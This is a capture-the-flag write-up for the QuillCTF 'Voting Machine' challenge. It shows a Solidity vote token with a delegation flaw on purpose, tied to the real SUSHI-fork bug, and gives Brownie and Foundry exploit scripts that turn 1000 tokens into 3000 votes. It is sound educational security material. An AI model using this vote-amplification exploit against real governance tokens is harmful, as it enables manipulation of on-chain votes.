---
title: Voting Machine - Quillctf
#image: 'https://quillctf.super.site/_next/image?url=https%3A%2F%2Fassets.super.so%2Fa799195c-7c08-410a-9254-50dd9f21a772%2Fimages%2F6e1d60ba-8a0b-4588-9413-fb30d1dfee82%2F1374FC4A-D8B8-4767-B951-ED874164BB64.png&w=1920&q=80'
created: 2023-04-25
tags:
    - 'smart contracts'
    - 'web3'
    - 'brownie'
    - 'quillctf'
---

# Voting Machine
### **Objective of CTF**

Accumulate at least 3000 votes in your hacker address. You don’t have any tokens in your wallet.

_After trying all attempts and failing, you decided to perform a phishing attack and you successfully obtained the private keys from three users:_ **_Alice_**_,_ **_Bob_**_, and_ **_Carl_**_._

_Fortunately, Alice had 1000 vTokens, but Bob and Carl don’t have any tokens in their accounts. (see foundry setUp)_

_Now that you have access to the private keys of Alice, Bob, and Carl's accounts. So, try again._

- `VoteToken`
```js
pragma solidity 0.8.12;

import "@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract VoteToken is ERC20("Vote Token", "vToken") {

    address public owner;

    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }

    function burn(address _from, uint256 _amount) public onlyOwner {
        _burn(_from, _amount);
        _moveDelegates(_delegates[_from], address(0), _amount);
    }


    mapping(address => address) internal _delegates;

    struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }


    function _moveDelegates(address from, address to, uint256 amount) internal {
        if (from != to && amount > 0) {
            if (from != address(0)) {
                uint32 fromNum = numCheckpoints[from];
                uint256 fromOld = fromNum > 0 ? checkpoints[from][fromNum - 1].votes : 0;
                uint256 fromNew = fromOld - amount;
                _writeCheckpoint(from, fromNum, fromOld, fromNew);
            }

            if (to != address(0)) {
                uint32 toNum = numCheckpoints[to];
                uint256 toOld = toNum > 0 ? checkpoints[to][toNum - 1].votes : 0;
                uint256 toNew = toOld + amount;
                _writeCheckpoint(to, toNum, toOld, toNew);
            }
        }
    }

    mapping(address => mapping(uint32 => Checkpoint)) public checkpoints;
    mapping(address => uint32) public numCheckpoints;

    function delegates(address _addr) external view returns (address) {
        return _delegates[_addr];
    }

    function delegate(address _addr) external {
        return _delegate(msg.sender, _addr);
    }


    function getVotes(address _addr) external view returns (uint256) {
        uint32 nCheckpoints = numCheckpoints[_addr];
        return nCheckpoints > 0 ? checkpoints[_addr][nCheckpoints - 1].votes : 0;
    }

    function _delegate(address _addr, address delegatee) internal {
        address currentDelegate = _delegates[_addr];
        uint256 _addrBalance = balanceOf(_addr);
        _delegates[_addr] = delegatee;
        _moveDelegates(currentDelegate, delegatee, _addrBalance);
    }


    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint256 oldVotes, uint256 newVotes) internal {
        uint32 blockNumber = uint32(block.number);

        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }
    }
}
```

## Vulnerability 
- The vulnerability is `voting amplification`. This attack enables attackers to massively amplify their votes on any desired representative or proposals with a minimal attack cost. The `**_moveDelegates**` **function that is the root cause of the attack. This function is executed during the voting delegation process to move the delegator’s votes to the representative**. In other words, the amount of the votes (represented by the vTokens tokens) from a delegator will be increased to the representative. The is the real world scenarios of the governance token of Sushiswap `SUSHI` & all it's forks. More on this can be found [here](https://medium.com/valixconsulting/sushiswap-voting-vulnerability-of-sushi-token-and-its-forks-56f220d4c9ba) 


# Solution 
- We have `3` accounts; `Alice`, `Bob` & `Carl` & of course `Attacker`. Alice has 1000 `vTokens`. So what we can do is first we can cast our vote for attacker then we can transfer the funds to Bob or Carl & then using their account we can repeat the process. This way after everyone casts their votes the attacker will have `3000` votes & when the last voter can send it's tokens to attacker then the balance of attacker will be `1000`  which will pass all the checks.


## Brownie

- `helpful_scripts.py`
```py
#!/usr/bin/python3
from brownie import network, accounts, config

FORKED_LOCAL_ENVIRONMENTS = ["mainnet-fork", "mainnet-fork-dev"]
LOCAL_BLOCKCHAIN_ENVIRONMENTS = [
    "development",
    "ganache-local",
    "ganache-local-new-chainId",
]


def get_account():
    if (
        network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS
        or network.show_active() in FORKED_LOCAL_ENVIRONMENTS
    ):
        return (
            accounts[0],
            accounts[1],
            accounts[2],
            accounts[3],
            accounts[4],
        )

    if network.show_active() in config["networks"]:
        return accounts.add(config["wallets"]["from_key"])

    return None

```
- `deploy.py`. Setup testing accounts & contracts
```py
#!/usr/bin/python3
from brownie import VoteToken
from scripts.helpful_scripts import get_account


def deploy():
    owner, alice, bob, carl, attacker = get_account()

    vt = VoteToken.deploy({"from": owner})

    print(f"Contract Deployed to {vt.address}")

    # Give Alice 1000 vTokens
    vt.mint(alice.address, 1000, {"from": owner}).wait(1)

    return vt, owner, alice, bob, carl, attacker


def main():
    deploy()

```
- `attack.py`
```py
#!/usr/bin/python3
from brownie import VoteToken
from colorama import Fore
from scripts.deploy import deploy


# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack():
    vToken, owner, alice, bob, carl, attacker = deploy()
    # print(vToken.balanceOf(attacker))
    # print(vToken.balanceOf(alice))

    # delegate attacker from alice
    vToken.delegate(attacker.address, {"from": alice}).wait(1)
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    # transfer the funds to bob so that he can vote again
    vToken.transfer(bob.address, 1000, {"from": alice}).wait(1)

    print(f"{red}Funds transferred from alice to bob{reset}")
    print(f"{green}Balance of Alice: {magenta}{vToken.balanceOf(alice)}{reset}")
    print(f"{green}Balance of Bob: {magenta}{vToken.balanceOf(bob)}{reset}")

    # same task vote for attacker from bob
    vToken.delegate(attacker.address, {"from": bob}).wait(1)
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    vToken.transfer(carl.address, 1000, {"from": bob}).wait(1)
    print(f"{red}Funds transferred from Bob to Carl{reset}")

    print(f"{green}Balance of Bob: {magenta}{vToken.balanceOf(bob)}{reset}")
    print(f"{green}Balance of Carl: {magenta}{vToken.balanceOf(carl)}{reset}")

    # same task vote for attacker from carl
    vToken.delegate(attacker.address, {"from": carl}).wait(1)
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    vToken.transfer(attacker.address, 1000, {"from": carl}).wait(1)
    print(f"{red}Funds transferred from Carl to Attacker{reset}")

    print(f"{green}Balance of Alice: {magenta}{vToken.balanceOf(alice)}{reset}")
    print(f"{green}Balance of Bob: {magenta}{vToken.balanceOf(bob)}{reset}")
    print(f"{green}Balance of Carl: {magenta}{vToken.balanceOf(carl)}{reset}")
    print(f"{green}Balance of Atacker: {magenta}{vToken.balanceOf(attacker)}{reset}")
    print(f"{green}Attacker votes: {red}{vToken.getVotes(attacker)}{reset}")

    assert vToken.getVotes(attacker) == 3000
    assert vToken.balanceOf(attacker) == 1000


def main():
    attack()
```
- Run like this 
```js
brownie run scripts/attack.py
```

![](assets/voting_m1.png)

## Foundry
- `exploitTest.t.sol`. The logic is the same

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/VotingMachine.sol";

contract exploitTest is Test {
    VoteToken vToken;
    address public owner = address(0);
    address public hacker = address(1337);

    address public alice = address(1);
    address public bob = address(2);
    address public carl = address(3);

    function setUp() public {
        vm.startPrank(owner);
        vToken = new VoteToken();
        vToken.mint(alice, 1000);
        vm.stopPrank();
    }

    function testExploit() public {
        uint hacker_vote = vToken.getVotes(hacker);
        vm.startPrank(alice);

        // soluiton
        vToken.delegate(hacker);
        console.log("Hacker's vote: ", vToken.getVotes(hacker));

        vToken.transfer(bob, 1000);
        // console.log("Bob's bakance: ", vToken.balanceOf(bob));
        vm.stopPrank();

        vm.startPrank(bob);
        vToken.delegate(hacker);
        console.log("Hacker's vote: ", vToken.getVotes(hacker));

        vToken.transfer(carl, 1000);
        // console.log("Bob's bakance: ", vToken.balanceOf(bob));
        vm.stopPrank();

        vm.startPrank(carl);
        vToken.delegate(hacker);
        console.log("Hacker's vote: ", vToken.getVotes(hacker));

        vToken.transfer(hacker, 1000);
        // console.log("Carl's bakance: ", vToken.balanceOf(carl));
        vm.stopPrank();

        console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

        hacker_vote = vToken.getVotes(hacker);
        console.log("Vote Count of Hacker after attack: %s ", hacker_vote);

        uint hacker_balance = vToken.balanceOf(hacker);
        console.log("Hacker's vToken after the attack: %s ", hacker_balance);

        assertEq(hacker_vote, 3000);
        assertEq(hacker_balance, 1000);
    }
}

```


![](assets/voting_m2.png)